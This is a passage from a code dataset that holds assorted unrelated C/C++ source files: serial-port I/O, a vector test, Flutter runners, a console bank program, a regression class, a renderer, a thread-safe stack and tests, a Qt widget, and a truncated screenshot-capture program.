FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\n        NULL\n        );\n\n    if (_serial_handle == INVALID_HANDLE_VALUE) return false;\n\n    if (!SetupComm(_serial_handle, SERIAL_RX_BUFFER_SIZE, SERIAL_TX_BUFFER_SIZE))\n    {\n        close();\n        return false;\n    }\n    \n    _dcb.BaudRate = baudrate;\n    _dcb.ByteSize = 8;\n    _dcb.Parity   = NOPARITY;\n    _dcb.StopBits = ONESTOPBIT;\n    _dcb.fDtrControl = DTR_CONTROL_ENABLE;\n\n    if (!SetCommState(_serial_handle, &_dcb))\n    {\n        close();\n        return false;\n    }\n\n    if (!SetCommTimeouts(_serial_handle, &_co))\n    {\n        close();\n        return false;\n    }\n\n    if (!SetCommMask(_serial_handle, EV_RXCHAR | EV_ERR ))\n    {\n        close();\n        return false;\n    }\n\n    if (!PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_RXABORT | PURGE_TXCLEAR | PURGE_RXCLEAR ))\n    {\n        close();\n        return false;\n    }\n\n    Sleep(30); \n    _is_serial_opened = true;\n\n    //Clear the DTR bit set DTR=high\n    clearDTR();\n\n    return true;\n}\n\nvoid raw_serial::close()\n{\n    SetCommMask(_serial_handle, 0);\n    ResetEvent(_wait_o.hEvent);\n\n    CloseHandle(_serial_handle);\n    _serial_handle = INVALID_HANDLE_VALUE;\n    \n    _is_serial_opened = false;\n}\n\nint raw_serial::senddata(const unsigned char * data, size_t size)\n{\n    DWORD    error;\n    DWORD w_len = 0, o_len = -1;\n    if (!isOpened()) return ANS_DEV_ERR;\n\n    if (data == NULL || size ==0) return 0;\n    \n    if(ClearCommError(_serial_handle, &error, NULL) && error > 0)\n        PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_TXCLEAR);\n\n    if(!WriteFile(_serial_handle, data, (DWORD)size, &w_len, &_wo))\n        if(GetLastError() != ERROR_IO_PENDING)\n            w_len = ANS_DEV_ERR;\n\n    return w_len;\n}\n\nint raw_serial::recvdata(unsigned char * data, size_t size)\n{\n    if (!isOpened()) return 0;\n    DWORD r_len = 0;\n\n\n    if(!ReadFile(_serial_handle, data, (DWORD)size, &r_len, &_ro))\n    {\n        if(GetLastError() == ERROR_IO_PENDING) \n        {\n            if(!GetOverlappedResult(_serial_handle, &_ro, &r_len, FALSE))\n            {\n                if(GetLastError() != ERROR_IO_INCOMPLETE)\n                    r_len = 0;\n            }\n        }\n        else\n            r_len = 0;\n    }\n\n    return r_len;\n}\n\nvoid raw_serial::flush( _u32 flags)\n{\n    PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_RXABORT | PURGE_TXCLEAR | PURGE_RXCLEAR );\n}\n\nint raw_serial::waitforsent(_u32 timeout, size_",
    "#include <iostream>\n#include \"SimpleVector.h\"\nusing namespace std;\n\n\n\nvoid main()\n{\n\n    srand(unsigned(time(nullptr)));\n    \n    cout << \"--------------------------------------------------------\" << endl;\n    SimpleVector<int> v1;\n\n    cout << \"[\uae30\ubcf8 \uc0dd\uc131 \ubc30\uc5f4]\" << endl;\n    cout << \"\ucd08\uae30\ud654 \ubc30\uc5f4 : \"; v1.print();\n    cout << \".push_back \ud14c\uc2a4\ud2b8 - \uc785\ub825 : \";\n    for (int i = 1; i < 11; i++)\n    {\n        int randNum = rand() % 100;\n        v1.push_back(randNum);\n        cout << randNum << \",\";\n    }\n    cout << endl;\n    \n    cout << \"\uc791\uc5c5 \ud6c4 \ubc30\uc5f4 : \"; v1.print();\n    cout << \"size : \" << v1.size() << endl;\n    cout << \"capacity : \" << v1.capacity() << endl;\n    cout << \"--------------------------------------------------------\" << endl;\n    \n    cout << \" \" << endl;\n    \n    cout << \"--------------------------------------------------------\" << endl;\n    int size = 20;\n    SimpleVector<int> v2(size);\n    \n    cout << \"[\ub3d9\uc801 \uae30\ubc18 \uc0dd\uc131 \ubc30\uc5f4]\" << endl;\n    cout << \"\uc785\ub825 size :\" << size << endl;\n    \n    cout << \"\ucd08\uae30\ud654 \ubc30\uc5f4 : \"; v2.print();\n    cout << \".push_back \ud14c\uc2a4\ud2b8 - \uc785\ub825 : \";\n    for (int i = 0; i < size; i++)\n    {\n        int randNum = rand() % 100;\n        v2.push_back(randNum);\n        cout << randNum << \",\";\n    }\n    cout << \" \" << endl;\n\n    cout << \"\uc791\uc5c5 \ud6c4 \ubc30\uc5f4 : \"; v2.print();\n    cout << \"size : \" << v2.size() << endl;\n    cout << \"capacity : \" << v2.capacity() << endl;\n    \n    \n    cout << \"--------------------------------------------------------\" << endl;\n    int addSize = 10;\n    cout << \"size \ucd94\uac00 : \" << addSize << endl;\n    cout << \"size \ucd94\uac00 .push_back \ud14c\uc2a4\ud2b8 - \uc785\ub825 : \";\n    for (int i = 0; i < addSize; i++)\n    {\n        int randNum = rand() % 100;\n        v2.push_back(randNum);\n        cout << randNum << \",\";\n    }\n    cout << \" \" << endl;\n    cout << \"\ucd94\uac00 \uc791\uc5c5 \ud6c4 \ubc30\uc5f4 : \"; v2.print();\n    cout << \"size : \" << v2.size() << endl;\n    cout << \"capacity : \" << v2.capacity() << endl;\n    cout << \"--------------------------------------------------------\" << endl;\n\n    \n    int resize = 15;\n    cout << \"resize : \" << resize << endl;\n    v2.resize(resize);\n    cout << \"resize \ud6c4 \ubc30\uc5f4 : \"; v2.print();\n    cout << \"size : \" << v2.size() << endl;\n    cout << \"capacity : \" << v2.capacity() << endl;\n    cout << \"--------------------------------------------------------\" << endl;\n\n    cout << \" \" << endl;\n    SimpleVector<int> v3(v2);\n    cout << \"\ubcf5\uc0ac \uc0dd\uc131\uc790 \ud14c\uc2a4\ud2b8 : \"; v3.print();\n    cout << \"size : \" << v3.size() << endl;\n    cout << \"capacity : \" << v3.capacity() << endl;\n\n    cout << \" \" << endl;\n    v3.sortData(false);\n    cout << \"\uc624\ub984\ucc28\uc21c \uc815\ub82c : \"; v3.print();\n    v3.sortData(true);\n    cout << \"\ub0b4\ub9bc\ucc28\uc21c \uc815\ub82c : \"; v3.print();\n    cout << \"size : \" << v3.size() << endl;\n    cout << \"capacity : \" << v3.capacity() << endl;\n    return;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pokemon_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <iomanip>\nusing namespace std;\n\nclass BankAccount {\nprivate:\n    string accountNumber;\n    string name;\n    double balance;\n\npublic:\n    void createAccount() {\n        cout << \"Enter Account Number: \";\n        cin >> accountNumber;\n        cout << \"Enter Name: \";\n        cin.ignore();\n        getline(cin, name);\n        cout << \"Enter Initial Balance: \";\n        cin >> balance;\n        cout << \"Account Created Successfully!\\n\";\n    }\n\n    void showAccount() const {\n        cout << \"Account Number: \" << accountNumber << endl;\n        cout << \"Name: \" << name << endl;\n        cout << \"Balance: $\" << fixed << setprecision(2) << balance << endl;\n    }\n\n    void deposit(double amount) {\n        if (amount > 0) {\n            balance += amount;\n            cout << \"Amount Deposited Successfully!\\n\";\n        } else {\n            cout << \"Invalid Deposit Amount!\\n\";\n        }\n    }\n\n    void withdraw(double amount) {\n        if (amount > 0 && amount <= balance) {\n            balance -= amount;\n            cout << \"Amount Withdrawn Successfully!\\n\";\n        } else {\n            cout << \"Insufficient Balance or Invalid Amount!\\n\";\n        }\n    }\n\n    string getAccountNumber() const {\n        return accountNumber;\n    }\n\n    double getBalance() const {\n        return balance;\n    }\n};\n\nvoid saveAccountToFile(const BankAccount &account, const string &filename) {\n    ofstream outFile(filename, ios::app);\n    if (outFile.is_open()) {\n        outFile << account.getAccountNumber() << \"\\n\"\n                << account.getBalance() << \"\\n\";\n        outFile.close();\n        cout << \"Account details saved to file.\\n\";\n    } else {\n        cout << \"Error: Unable to save account details.\\n\";\n    }\n}\n\nvoid displayMenu() {\n    cout << \"\\nBank Management System\\n\";\n    cout << \"1. Create Account\\n\";\n    cout << \"2. Show Account\\n\";\n    cout << \"3. Deposit\\n\";\n    cout << \"4. Withdraw\\n\";\n    cout << \"5. Exit\\n\";\n    cout << \"Enter your choice: \";\n}\n\nint main() {\n    BankAccount account;\n    bool isRunning = true;\n    string filename = \"accounts.txt\";\n\n    while (isRunning) {\n        displayMenu();\n        int choice;\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            account.createAccount();\n            saveAccountToFile(account, filename);\n            break;\n        case 2:\n            account.showAccount();\n            break;\n        case 3: {\n            double depositAmount;\n            cout << \"Enter Deposit Amount: \";\n            cin >> depositAmount;\n            account.deposit(depositAmount);\n            break;\n        }\n        case 4: {\n            double withdrawAmount;\n            cout << \"Enter Withdrawal Amount: \";\n            cin >> withdrawAmount;\n            account.withdraw(withdrawAmount);\n            break;\n        }\n        case 5:\n            isRunning = false;\n            cout << \"Thank you for using the Bank Management System. Goodbye!\\n\";\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\\n\";\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"StdAfx.h\"\n#include \"MultipleLinearRegressionMulY.h\"\n\nCMultipleLinearRegressionMulY::CMultipleLinearRegressionMulY(LR_CountT nRegressors , LR_CountT nY) : m_Core(nRegressors)\n{\n\tm_pSumXnYList = NULL;\n\tReInit(nRegressors , nY);\n}\nvoid CMultipleLinearRegressionMulY::ReInit(LR_CountT nRegressors , LR_CountT nY)\n{\n\tLR_CountT nSize;\n\tif( nRegressors < 1 )\n\t{\n\t\tnRegressors = 1;\n\t}\n\tm_Core.ReInit(nRegressors);\n\tif( nY < 1 )\n\t{\n\t\tnY = 1;\n\t}\n\tm_nXY = nRegressors + 1;\n\tnSize = m_nXY * nY;\n\tif( m_pSumXnYList != NULL )\n\t{\n\t\tif( m_nRegressors != nRegressors || m_nY != nY )\n\t\t{\n\t\t\tdelete []m_pSumXnYList;\n\t\t\tm_pSumXnYList = NULL;\n\t\t}\n\t}\n\tif( m_pSumXnYList == NULL )\n\t{\n\t\tm_pSumXnYList = new LR_DataT[nSize];\n\t}\n\tm_nRegressors = nRegressors;\n\tm_nY = nY;\n\t\n\t// for( LR_CountT i = 0 ; i < nSize ; i++ )\n\t// {\n\t\t// m_pSumXnYList[i] = 0.0;\n\t// }\n\tmemset(m_pSumXnYList , 0 , nSize*sizeof(LR_DataT));\n}\n\nCMultipleLinearRegressionMulY::~CMultipleLinearRegressionMulY()\n{\n\tdelete []m_pSumXnYList;\n\tm_pSumXnYList = NULL;\n}\n\nBOOL CMultipleLinearRegressionMulY::AddXY(LR_DataT* pX , LR_DataT* pY)\n{\n\tLR_CountT i , k;\n\tLR_DataT xy , y;\n\tLR_DataT* pSumXnYList;\n\t//for( i = 0 ; i < m_nY ; i++ )\n\t//{\n\t//\tm_Core.GetSumXnYData()[i] = m_pSumXnYList[i];\n\t//}\n\tmemcpy(m_Core.GetSumXnYData() , m_pSumXnYList , m_nXY*sizeof(LR_DataT));\n\tif( !m_Core.AddXY(pX , pY[0]) )\n\t{\n\t\treturn FALSE;\n\t}\n\t//for( i = 0 ; i < m_nY ; i++ )\n\t//{\n\t//\tm_pSumXnYList[i] = m_Core.GetSumXnYData()[i];\n\t//}\n\tmemcpy(m_pSumXnYList , m_Core.GetSumXnYData() , m_nXY*sizeof(LR_DataT));\n\tpSumXnYList = &m_pSumXnYList[m_nXY];\n\tfor( i = 1 ; i < m_nY ; i++ )\n\t{\n\t\ty = pY[i];\n\t\t*pSumXnYList += y;\n\t\tpSumXnYList++;\n\t\tfor( k = 0 ; k < m_nRegressors ; k++ )\n\t\t{\n\t\t\txy = pX[k];\n\t\t\txy *= y;\n\t\t\t*pSumXnYList += xy;\n\t\t\tpSumXnYList++;\n\t\t}\n\t}\n\t\n\t/*\n\t// Output raw data\n\tCString str;\n\tfor( i = 0 , k = (m_nXY*m_nY) ; i < k ; i++ )\n\t{\n\t\tstr.Format(_T(\"%g  \") , (double)m_pSumXnYList[i]);\n\t\tTRACE(str);\n\t}\n\t*/\n\t\n\treturn TRUE;\n}\n\nLR_DataT* CMultipleLinearRegressionMulY::GetResults(LR_CountT idx)\n{\n\tif( idx >= m_nY )\n\t{\n\t\treturn NULL;\n\t}\n\t//for( INT i = 0 ; i < m_nY ; i++ )\n\t//{\n\t//\tm_Core.GetSumXnYData()[i] = m_pSumXnYList[(idx*m_nXY)+i];\n\t//}\n\tmemcpy(m_Core.GetSumXnYData() , &m_pSumXnYList[idx*m_nXY] , m_nXY*sizeof(LR_DataT));\n\tm_Core.SetRefresh();\n\treturn m_Core.GetResults();\n}\n\nLR_DataT* CMultipleLinearRegressionMulY::GetResultsInterceptZero(LR_CountT idx)\n{\n\tif( idx >= m_nY )\n\t{\n\t\treturn NULL;\n\t}\n\t//for( INT i = 0 ; i < m_nY ; i++ )\n\t//{\n\t//\tm_Core.GetSumXnYData()[i] = m_pSumXnYList[(idx*m_nXY)+i];\n\t//}\n\tmemcpy(m_Core.GetSumXnYData() , &m_pSumXnYList[idx*m_nXY] , m_nXY*sizeof(LR_DataT));\n\tm_Core.SetRefresh();\n\treturn m_Core.GetResultsInterceptZero();\n}\n",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <cmath>\n#include <cstdlib>\n#include <chrono>\n#include <algorithm>\n#include \"C:\\Users\\Jackson\\Desktop\\Projects\\myRenderer\\include\\ppm.h\"\n#include \"C:\\Users\\Jackson\\Desktop\\Projects\\myRenderer\\include\\obj.h\"\nusing namespace std;\n\n// function to draw line between two points\nvoid line(int x0, int y0, int x1, int y1, string r, string g, string bl, PPM& image) {\n    // bresenham's algorithm\n    int dx = abs(x1 - x0);\n    int dy = abs(y1 - y0);\n    int sx = (x0 < x1) ? 1 : -1; // step in x direction\n    int sy = (y0 < y1) ? 1 : -1; // step in y direction\n    int err = dx - dy; // error value\n\n    while (true) {\n        image.edit_pixel(x0, y0, r, g, bl); // set pixel\n\n        if (x0 == x1 && y0 == y1) break; // exit condition\n\n        int err2 = err * 2;\n        if (err2 > -dy) {\n            err -= dy;\n            x0 += sx;\n        }\n        if (err2 < dx) {\n            err += dx;\n            y0 += sy;\n        }\n    }\n}\n\n// Function to subtract two 3D vectors\nvector<float> operator-(const vector<float>& a, const vector<float>& b) {\n    return {a[0] - b[0], a[1] - b[1], a[2] - b[2]};\n}\n\n// Function to calculate the dot product of two 3D vectors\nfloat operator*(const vector<float>& a, const vector<float>& b) {\n    return a[0] * b[0] + a[1] * b[1] + a[2] * b[2];\n}\n\n// Function to calculate the cross product of two 3D vectors\nvector<float> cross_product(const vector<float>& a, const vector<float>& b) {\n    return {\n        a[1] * b[2] - a[2] * b[1],\n        a[2] * b[0] - a[0] * b[2],\n        a[0] * b[1] - a[1] * b[0]\n    };\n}\n\n// Scalar multiplication for vector<float>\nvector<float> operator*(float scalar, const vector<float>& vec) {\n    return {scalar * vec[0], scalar * vec[1]};\n}\n\n// Vector addition\nvector<float> operator+(const vector<float>& a, const vector<float>& b) {\n    return {a[0] + b[0], a[1] + b[1]};\n}\n\n// fill faces helpers\n// calculate area\nfloat triangle_area(vector<float> a, vector<float> b, vector<float> c) {\n    return 0.5 * abs(a[0] * (b[1] - c[1]) + b[0] * (c[1] - a[1]) + c[0] * (a[1] - b[1]));\n}\n// Check if a point is inside the triangle formed by a, b, c\nbool is_point_in_triangle(vector<float> p, vector<float> a, vector<float> b, vector<float> c) {\n    float area_abc = triangle_area(a, b, c);\n    float area_pbc = triangle_area(p, b, c);\n    float area_pca = triangle_area(p, c, a);\n    float area_pab = triangle_area(p, a, b);\n    // Compute weights\n    float alpha = area_pbc / area_abc;\n    float beta = area_pca / area_abc;\n    float gamma = area_pab / area_abc;\n    // Check if the point is inside the triangle\n    return (alpha >= 0 && beta >= 0 && gamma >= 0 && abs((alpha + beta + gamma)- 1) < .0001);\n}\n// Check if a vertex forms an ear with its neighbors\nbool is_ear(vector<int> polygon, int i, OBJ& input) {\n    // declare\n    vector<float> pVert;\n    vector<float> cVert;\n    vector<float> nVert;\n    // get cords\n    int n = polygon.size();\n    int prev = polygon[(i - 1 + n) % n];\n    pVert = input.getVert(prev - 1);\n    int curr = polygon[i];\n    cVert = input.getVert(curr - 1);\n    int next = polygon[(i + 1) % n];\n    nVert = input.getVert(next - 1);\n    // Check if no other vertex is inside the triangle\n    for (int j = 0; j < n; j++) {\n        if (j == (i - 1 + n) % n || j == i || j == (i + 1) % n) continue;\n        if (is_point_in_triangle(input.getVert(polygon[j] - 1), pVert, cVert, nVert)) return false;\n    }\n    return true;\n}\n\n// barycentric helper functions\n// calculate bary cords\nbool barycentric_coords(vector<float> p, vector<float> a, vector<float> b, vector<float> c) {\n    float area_abc = triangle_area(a, b, c);\n    float area_pbc = triangle_area(p, b, c);\n    float area_pca = triangle_area(p, c, a);\n    float area_pab = triangle_area(p, a, b);\n    // Compute weights\n    float alpha = area_pbc / area_abc;\n    float beta = area_pca / area_abc;\n    float gamma = area_pab / area_abc;\n    // Check if the point is inside the triangle\n    return (alpha >= 0 && beta >= 0 && gamma >= 0 && abs((alpha + beta + gamma)- 1) < .08);\n}\n\nfloat barycentricZ(vector<float> p, vector<float> a, vector<float> b, vector<float> c, vector<float> z) {\n    // declare\n    float z1;\n    // areas\n    float area_abc = triangle_area(a, b, c);\n    float area_pbc = triangle_area(p, b, c);\n    float area_pca = triangle_area(p, c, a);\n    float area_pab = triangle_area(p, a, b);\n    // Compute weights\n    float alpha = area_pbc / area_abc;\n    float beta = area_pca / area_abc;\n    float gamma = area_pab / area_abc;\n    // compute z bary val\n    z1 = alpha * z[0] + beta * z[1] + gamma * z[2];\n    return z1;\n}\n\nvector<float> textureMap(vector<float> p, vector<float> a, vector<float> b, vector<float> c, vector<vector<float>> tC) {\n    // declare \n    vector<float> tCords;\n    // areas\n    float area_abc = triangle_area(a, b, c);\n    float area_pbc = triangle_area(p, b, c);\n    float area_pca = triangle_area(p, c, a);\n    float area_pab = triangle_area(p, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"feature2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <memory>\n#include <exception>\n#include <mutex>\n#include <stack>\n#include <thread>\n#include <vector>\n#include <cassert>\n#include <algorithm>\n\nstruct empty_stack : std::exception {\n    const char* what() const noexcept override {\n        return \"empty stack!\";\n    }\n};\n\ntemplate<typename T>\nclass threadsafe_stack {\nprivate:\n    std::stack<T> data;\n    mutable std::mutex m;\n\npublic:\n    threadsafe_stack() = default;\n\n    threadsafe_stack(const threadsafe_stack& other) {\n        std::lock_guard<std::mutex> lock(other.m);\n        data = other.data;\n    }\n\n    threadsafe_stack& operator=(const threadsafe_stack&) = delete;\n\n    void push(T new_value) {\n        std::lock_guard<std::mutex> lock(m);\n        data.push(std::move(new_value)); // Use move semantics for efficiency\n    }\n\n    std::shared_ptr<T> pop() {\n        std::lock_guard<std::mutex> lock(m);\n        if (data.empty()) throw empty_stack();\n\n        auto res = std::make_shared<T>(data.top());\n        data.pop();\n        return res;\n    }\n\n    void pop(T& value) {\n        std::lock_guard<std::mutex> lock(m);\n        if (data.empty()) throw empty_stack();\n\n        value = data.top();\n        data.pop();\n    }\n\n    bool empty() const {\n        std::lock_guard<std::mutex> lock(m);\n        return data.empty();\n    }\n};\n\nvoid concurrent_push(threadsafe_stack<int>& stack, int start, int end) {\n    for (int i = start; i < end; ++i) {\n        stack.push(i);\n    }\n}\n\nvoid concurrent_pop(threadsafe_stack<int>& stack, std::vector<int>& results, int count, std::mutex& results_mutex) {\n    for (int i = 0; i < count; ++i) {\n        try {\n            auto value = stack.pop();\n            std::lock_guard<std::mutex> lock(results_mutex);\n            results.push_back(*value);\n        } catch (const empty_stack&) {\n            // Handle empty stack case\n            // Optionally log or ignore\n            // std::cerr << \"Attempted to pop from an empty stack.\" << std::endl;\n        }\n    }\n}\n\nvoid test_concurrent_operations() {\n    threadsafe_stack<int> stack;\n\n    const int num_threads = 5;\n    const int items_per_thread = 100;\n\n    std::vector<std::thread> threads;\n\n    // Start threads to push items into the stack\n    for (int i = 0; i < num_threads; ++i) {\n        threads.emplace_back(concurrent_push, std::ref(stack), i * items_per_thread, (i + 1) * items_per_thread);\n    }\n\n    // Wait for all pushing threads to finish\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    threads.clear();\n\n    std::vector<int> results;\n    std::mutex results_mutex;\n\n    // Start threads to pop items from the stack\n    for (int i = 0; i < num_threads; ++i) {\n        threads.emplace_back(concurrent_pop, std::ref(stack), std::ref(results), items_per_thread, std::ref(results_mutex));\n    }\n\n    // Wait for all popping threads to finish\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    // Check if all items were popped correctly\n    assert(results.size() == num_threads * items_per_thread);\n\n    // Verify that results contain all expected values\n    std::vector<int> expected_results(num_threads * items_per_thread);\n    \n    for (int i = 0; i < expected_results.size(); ++i) {\n        expected_results[i] = i;\n    }\n\n    // Sort results and expected_results for comparison\n    std::sort(results.begin(), results.end());\n    \n    assert(results == expected_results);\n}\n\nvoid test_sequential_operations() {\n    threadsafe_stack<int> stack;\n\n    // Test push and pop operations\n    stack.push(1);\n    stack.push(2);\n    stack.push(3);\n\n    int value;\n\n    // Pop should return 3\n    stack.pop(value);\n    assert(value == 3);\n\n    // Pop should return 2\n    stack.pop(value);\n    assert(value == 2);\n\n    // Pop should return 1\n    stack.pop(value);\n    assert(value == 1);\n\n    // Check if the stack is empty\n    assert(stack.empty());\n}\n\nint main() {\n   try {\n       test_sequential_operations();\n       test_concurrent_operations();\n       std::cout << \"All tests passed!\" << std::endl;\n   } catch (const std::exception& e) {\n       std::cerr << \"Test failed: \" << e.what() << std::endl;\n   }\n\n   return 0;\n}\n",
    "/****************************************************************************//*\n * Copyright (C) 2021 Marek M. Cel\n *\n * Permission is hereby granted, free of charge, to any person obtaining\n * a copy of this software and associated documentation files (the \"Software\"),\n * to deal in the Software without restriction, including without limitation\n * the rights to use, copy, modify, merge, publish, distribute, sublicense,\n * and/or sell copies of the Software, and to permit persons to whom\n * the Software is furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included\n * in all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS\n * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\n * IN THE SOFTWARE.\n ******************************************************************************/\n\n#include <example/WidgetHI.h>\n#include <ui_WidgetHI.h>\n\n////////////////////////////////////////////////////////////////////////////////\n\nWidgetHI::WidgetHI( QWidget *parent ) :\n    QWidget( parent ),\n    _ui( new Ui::WidgetHI ),\n    _hi ( Q_NULLPTR ),\n    _layoutSq ( Q_NULLPTR )\n{\n    _ui->setupUi( this );\n\n    setupUi();\n\n    _hi = _ui->graphicsHI;\n}\n\n////////////////////////////////////////////////////////////////////////////////\n\nWidgetHI::~WidgetHI()\n{\n    if ( _layoutSq ) delete _layoutSq;\n    _layoutSq = Q_NULLPTR;\n\n    if ( _ui ) delete _ui;\n    _ui = Q_NULLPTR;\n}\n\n////////////////////////////////////////////////////////////////////////////////\n\nvoid WidgetHI::setupUi()\n{\n    _layoutSq = new LayoutSquare( this );\n\n    _layoutSq->setContentsMargins( 0, 0, 0, 0 );\n    _layoutSq->addWidget( _ui->graphicsHI );\n\n    setLayout( _layoutSq );\n}\n",
    "\ufeff#include <iostream>\n#include <vector>\n#include <thread>\n#include <winsock2.h>\n#include <windows.h>\n#include <gdiplus.h>\n\n#pragma comment(lib, \"ws2_32.lib\")\n#pragma comment(lib, \"gdiplus.lib\")\n\nconstexpr int PORT = 5451;\nconstexpr int WIDTH = 320; // \u0448\u0438\u0440\u0438\u043d\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nconstexpr int HEIGHT = 240; // \u0432\u044b\u0441\u043e\u0442\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nconstexpr long JPEG_QUALITY = 50L;\nconstexpr BYTE FOOTER[4] = { 0x55, 0x44, 0x55, 0x11 };\n\nGdiplus::GdiplusStartupInput gdiplusStartupInput;\nULONG_PTR gdiplusToken;\n\nint GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {\n    UINT num = 0;\n    UINT size = 0;\n    Gdiplus::ImageCodecInfo* pImageCodecInfo = nullptr;\n\n    Gdiplus::GetImageEncodersSize(&num, &size);\n    if (size == 0) return -1;\n\n    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));\n    if (pImageCodecInfo == nullptr) return -1;\n\n    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);\n\n    for (UINT j = 0; j < num; ++j) {\n        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {\n            *pClsid = pImageCodecInfo[j].Clsid;\n            free(pImageCodecInfo);\n            return j;\n        }\n    }\n    free(pImageCodecInfo);\n    return -1;\n}\n\nbool captureScreenshot(std::vector<BYTE>& buffer) {\n    using namespace Gdiplus;\n\n    HDC hdcScreen = GetDC(nullptr);\n    HDC hdcMem = CreateCompatibleDC(hdcScreen);\n    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));\n    SelectObject(hdcMem, hBitmap);\n\n    BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcScreen, 0, 0, SRCCOPY);\n\n    Bitmap bitmap(hBitmap, nullptr);\n    Bitmap resizedBitmap(WIDTH, HEIGHT, PixelFormat24bppRGB);\n    Graphics graphics(&resizedBitmap);\n    graphics.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);\n    graphics.DrawImage(&bitmap, 0, 0, WIDTH, HEIGHT);\n\n    IStream* stream = nullptr;\n    CreateStreamOnHGlobal(nullptr, TRUE, &stream);\n\n    CLSID encoderClsid;\n    GetEncoderClsid(L\"image/jpeg\", &encoderClsid);\n\n    EncoderParameters encoderParams;\n    encoderParams.Count = 1;\n    encoderParams.Parameter[0].Guid = EncoderQuality;\n    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;\n    encoderParams.Parameter[0].NumberOfValues = 1;\n    encoderParams.Parameter[0].Value = reinterpret_cast<void*>(const_cast<long*>(&JPEG_QUALITY));\n\n    resizedBitmap.Save(stream, &encoderClsid, &encoderParams);\n\n    LARGE_INTEGER liSize;\n    stream->Seek({ 0 }, STREAM_SEEK_END, (ULARGE_INTEGER*)&liSize);\n    stream->Seek({ 0 }, STREAM_SEEK_SET, nullptr);\n\n    buffer.resize((size_t)liSize.QuadPart + sizeof(FOOTER));\n    stream->Read(buffer.data(), (ULONG)liSize.QuadPart, nullptr);\n    memcpy(buffer.data() + liSize.QuadPart, FOOTER, sizeof(FOOTER));\n\n    stream->Release();\n    DeleteObject(hBitmap);\n    DeleteDC(hdcMem);\n    ReleaseDC(nullptr, hdcScreen);\n\n    std::cout << \"Screenshot captured and resized\" << 